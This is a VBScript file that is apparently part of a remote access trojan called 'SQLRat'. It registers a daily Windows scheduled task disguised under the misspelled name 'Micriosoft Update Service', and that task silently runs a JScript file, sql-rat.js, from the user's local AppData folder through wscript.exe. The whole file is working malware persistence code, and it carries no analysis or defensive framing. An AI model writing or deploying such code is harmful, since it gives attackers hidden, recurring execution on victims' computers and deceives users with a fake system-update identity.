'Schedule a daily task to first execute SQLRat 12min from now
Dim service
Set service = CreateObject("Schedule.Service")
Call service.Connect()
Dim rootFolder, taskDefinition, regInfo
Set rootFolder = service.GetFolder("\")
Set taskDefinition = service.NewTask(0)
Set regInfo = taskDefinition.RegistrationInfo
regInfo.Description = "Micriosoft Update Service"
regInfo.Author = "system"
Dim settings, triggers, trigger
Set settings = taskDefinition.settings
settings.Enabled = True
settings.StartWhenAvailable = True
settings.Hidden = False
Set triggers = taskDefinition.triggers
Set trigger = triggers.Create(2)
Dim currTime
Dim startTime, endTime
Dim datevalue, timevalue, dtsvalue
dtsnow = DateAdd("n", 5, Now)
dd = Right("00" & Day(dtsnow), 2)
mm = Right("00" & Month(dtsnow), 2)
yy = Year(dtsnow)
hh = Right("00" & Hour(dtsnow), 2)
nn = Right("00" & Minute(dtsnow), 2)
ss = Right("00" & Second(dtsnow), 2)
datevalue = yy & "-" & mm & "-" & dd
timevalue = hh & ":" & nn & ":" & ss
dtsvalue = datevalue & "T" & timevalue
endTime = "2024-04-18T09:10:00"
trigger.StartBoundary = dtsvalue
trigger.EndBoundary = endTime
trigger.DaysInterval = 1
trigger.ID = "DailyTriggerId"
trigger.Enabled = True
Dim Action
Set Action = taskDefinition.Actions.Create(0)
Set wshShell = CreateObject( "WScript.Shell" )
strLocalAppData = wshShell.ExpandEnvironmentStrings( "%LOCALAPPDATA%" ) + "\"
Action.Path = strLocalAppData + "wscript.exe"
Action.Arguments = "/b /e:jscript " + strLocalAppData + "sql-rat.js"
Call rootFolder.RegisterTaskDefinition("Micriosoft Update Service", taskDefinition, 6, , , 3)